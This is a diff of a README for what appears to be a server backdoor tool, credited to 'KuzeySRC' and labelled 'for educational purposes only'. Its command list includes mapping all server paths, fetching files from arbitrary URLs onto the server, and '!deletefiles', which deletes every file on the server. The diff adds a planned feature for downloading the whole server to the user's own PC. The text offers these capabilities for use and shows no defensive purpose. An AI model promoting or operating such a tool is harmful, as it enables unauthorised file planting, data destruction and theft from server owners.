@@ -2,6 +2,11 @@
 Made by KuzeySRC (15w30x) || For educational purposes only!!
 Developers are not responsible for any misuse or damage caused by this project.
 
+
+
+Next Update:
+downloading server to ur own pc
+
 Requirements:
 Apache Maven 3.9.9/4.0.0
 Java 16
@@ -81,9 +86,9 @@ Example: ban 15w30x
 
 !getpaths gets whole server's paths.
 
-!download (url) (file name) downloads a file on server root.
+!upload (url) (file name) uploads a file on server root.
 
-!pathdownload (url) (path) (file name) downloads (url) in specified path.
+!pathupload(url) (path) (file name) uploads (url) in specified path.
 
 !deletefiles deletes all files on the server.
 
